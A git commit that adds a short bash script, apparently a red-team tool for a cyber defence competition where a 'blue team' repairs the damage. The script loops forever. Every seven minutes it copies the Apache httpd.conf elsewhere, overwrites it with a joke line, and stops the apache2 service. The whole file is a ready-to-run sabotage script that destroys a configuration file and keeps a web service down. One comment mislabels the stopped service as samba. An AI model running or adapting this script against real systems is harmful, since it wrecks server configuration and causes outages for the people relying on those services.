42e87f4c43b6e5cd285eaa82d0f927a44eae41ce
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 15:10:01 -0400

    Create apache.sh

---
+++ apache.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+# Loop forever
+while true
+do
+ #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
+ sleep 420
+
+ #Generate random number, check if the number is even or odd
+ if [ $(( $RANDOM % 2)) -eq 0 ]
+ then
+ #Copy config file to other location, then overwrite original
+   cp '/etc/httpd/conf/httpd.conf' '/etc/mm.conf'
+   echo "I'm Batman" > '/etc/httpd/conf/httpd.conf'
+ else
+ #Copy config file to other location, then overwrite original
+   cp '/etc/httpd/conf/httpd.conf' '/home/mm.conf'
+   echo "You ever dance with the devil in the pale mooon light?" > '/etc/httpd/conf/httpd.conf'
+ fi
+ #Stop samba service
+ sudo service apache2 stop
+done
